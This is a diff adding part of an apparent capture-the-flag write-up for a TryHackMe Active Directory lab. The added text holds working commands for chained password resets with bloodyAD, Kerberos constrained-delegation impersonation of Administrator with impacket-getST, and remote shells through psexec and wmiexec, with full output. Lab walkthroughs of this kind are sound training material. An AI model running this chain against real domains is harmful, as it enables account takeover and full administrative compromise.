@@ -1082,7 +1082,128 @@ Click the arrow icon to run the query. In the resulting graph you can notice tha
 We can abuse these delegations since:
 - GenericAll: full rights to the object, including reset user's password
 - ForceChangePassword: we can change the user password
-- GenericWrite: combination of write permissions, including WriteProperty. Again that implies we can change the user password
+- GenericWrite: combination of write permissions, including WriteProperty. Again that implies we can change the user password.
+
+Remember that darla user has Kerberos Constrained Delegation (KDC) enabled as seen before, so if we control this account we are administrator. In Bloodhound graph view, if we select the objet darla_winters, in the node properties we can see:
+
+    Allowed To Delegate	cifs/HayStack.thm.corp/thm.corp:
+        cifs/HayStack.thm.corp
+        cifs/HAYSTACK
+        cifs/HayStack.thm.corp/THM
+        cifs/HAYSTACK/THM
+
+<b>Note that from now on the IP of the Haystack server is changed again</b>. 
+
+Let's proceed to change the password for the users. For these tasks I used [bloodyAD](https://github.com/CravateRouge/bloodyAD/wiki/Installation)
+- As tabatha change the password for shawna:
+
+       /opt/bloodyAD/bloodyAD.py --host 10.10.40.42 -d thm.corp -u tabatha_britt -p "xxxxxxx" set password shawna_bray Pwd1234
+      [+] Password changed successfully!
+
+          
+- Changing password for using shawna account cruz_hall password:
+
+      /opt/bloodyAD/bloodyAD.py --host 10.10.40.42 -d thm.corp -u shawna_bray -p "Pwd1234" set password cruz_hall Pwd1234
+      [+] Password changed successfully!
+- Finally change darla password.
+
+      /opt/bloodyAD/bloodyAD.py --host 10.10.40.42 -d thm.corp -u cruz_hall -p "Pwd1234" set password darla_winters Pwd1234
+      [+] Password changed successfully!
+
+We can verify the final result: RDP login to the server with darla credentials:
+
+    C:\Users\TEMP.THM>hostname & whoami
+    HayStack
+    thm\darla_winters
+  
+The final step is requiring a Service Ticket for the administrator using KDC:
+
+    impacket-getST  -dc-ip 10.10.40.42 -spn "cifs/haystack.thm.corp" -impersonate Administrator "thm.corp/DARLA_WINTERS:Pwd1234"
+    ...
+    [-] CCache file is not found. Skipping...
+    [*] Getting TGT for user
+    [*] Impersonating Administrator
+    [*] Requesting S4U2self
+    [*] Requesting S4U2Proxy
+    [*] Saving ticket in Administrator@cifs_haystack.thm.corp@THM.CORP.ccache
+
+Then to use the ticket in the current session:
+
+    export KRB5CCNAME=Administrator@cifs_haystack.thm.corp@THM.CORP.ccache 
+
+Then we can get a shell:
+
+    impacket-psexec -dc-ip 10.10.40.42 -target-ip 10.10.40.42 -k -no-pass administrator@haystack.thm.corp -debug 
+    [+] Impacket Library Installation Path: /usr/lib/python3/dist-packages/impacket
+    [+] StringBinding ncacn_np:haystack.thm.corp[\pipe\svcctl]
+    [+] Using Kerberos Cache: Administrator@cifs_haystack.thm.corp@THM.CORP.ccache
+    [+] Domain retrieved from CCache: thm.corp
+    [+] Returning cached credential for CIFS/HAYSTACK.THM.CORP@THM.CORP
+    [+] Using TGS from cache
+    [*] Requesting shares on 10.10.40.42.....
+    [*] Found writable share ADMIN$
+    [*] Uploading file gCsTDbYj.exe
+    [*] Opening SVCManager on 10.10.40.42.....
+    [*] Creating service XHhe on 10.10.40.42.....
+    [*] Starting service XHhe.....
+
+Actually the command prompt is never returned, at the moment I can't say why. Let's try using wmi. Check if the service is up:
+
+    nmap -Pn -sVC -p 135 10.10.40.42
+    ...
+    PORT    STATE SERVICE VERSION
+    135/tcp open  msrpc   Microsoft Windows RPC
+
+So we can use wmi to try to get a shell:
+
+    impacket-wmiexec -dc-ip 10.10.40.42 -target-ip 10.10.40.42 -k -no-pass administrator@haystack.thm.corp -debug
+    ...
+    [+] Impacket Library Installation Path: /usr/lib/python3/dist-packages/impacket
+    [+] Using Kerberos Cache: Administrator@cifs_haystack.thm.corp@THM.CORP.ccache
+    [+] Domain retrieved from CCache: thm.corp
+    [+] Returning cached credential for CIFS/HAYSTACK.THM.CORP@THM.CORP
+    [+] Using TGS from cache
+    [*] SMBv3.0 dialect used
+    [+] Using Kerberos Cache: Administrator@cifs_haystack.thm.corp@THM.CORP.ccache
+    [+] Domain retrieved from CCache: thm.corp
+    [+] SPN HOST/HAYSTACK.THM.CORP@THM.CORP not found in cache
+    [+] AnySPN is True, looking for another suitable SPN
+    [+] Returning cached credential for CIFS/HAYSTACK.THM.CORP@THM.CORP
+    [+] Using TGS from cache
+    [+] Changing sname from cifs/haystack.thm.corp@THM.CORP to HOST/HAYSTACK.THM.CORP@THM.CORP and hoping for the best
+    [+] Target system is haystack.thm.corp and isFQDN is True
+    [+] StringBinding: HayStack[58970]
+    [+] StringBinding chosen: ncacn_ip_tcp:haystack.thm.corp[58970]
+    [+] Using Kerberos Cache: Administrator@cifs_haystack.thm.corp@THM.CORP.ccache
+    [+] Domain retrieved from CCache: thm.corp
+    [+] SPN HOST/HAYSTACK.THM.CORP@THM.CORP not found in cache
+    [+] AnySPN is True, looking for another suitable SPN
+    [+] Returning cached credential for CIFS/HAYSTACK.THM.CORP@THM.CORP
+    [+] Using TGS from cache
+    [+] Changing sname from cifs/haystack.thm.corp@THM.CORP to HOST/HAYSTACK.THM.CORP@THM.CORP and hoping for the best
+    [+] Using Kerberos Cache: Administrator@cifs_haystack.thm.corp@THM.CORP.ccache
+    [+] Domain retrieved from CCache: thm.corp
+    [+] SPN HOST/HAYSTACK.THM.CORP@THM.CORP not found in cache
+    [+] AnySPN is True, looking for another suitable SPN
+    [+] Returning cached credential for CIFS/HAYSTACK.THM.CORP@THM.CORP
+    [+] Using TGS from cache
+    [+] Changing sname from cifs/haystack.thm.corp@THM.CORP to HOST/HAYSTACK.THM.CORP@THM.CORP and hoping for the best
+    [+] Using Kerberos Cache: Administrator@cifs_haystack.thm.corp@THM.CORP.ccache
+    [+] Domain retrieved from CCache: thm.corp
+    [+] SPN HOST/HAYSTACK.THM.CORP@THM.CORP not found in cache
+    [+] AnySPN is True, looking for another suitable SPN
+    [+] Returning cached credential for CIFS/HAYSTACK.THM.CORP@THM.CORP
+    [+] Using TGS from cache
+    [+] Changing sname from cifs/haystack.thm.corp@THM.CORP to HOST/HAYSTACK.THM.CORP@THM.CORP and hoping for the best
+    [!] Launching semi-interactive shell - Careful what you execute
+    [!] Press help for extra shell commands
+    C:\>whoami
+    thm\administrator
+
+Get the root flag
+
+    C:\>type C:\Users\administrator\desktop\root.txt
+
 
 
     
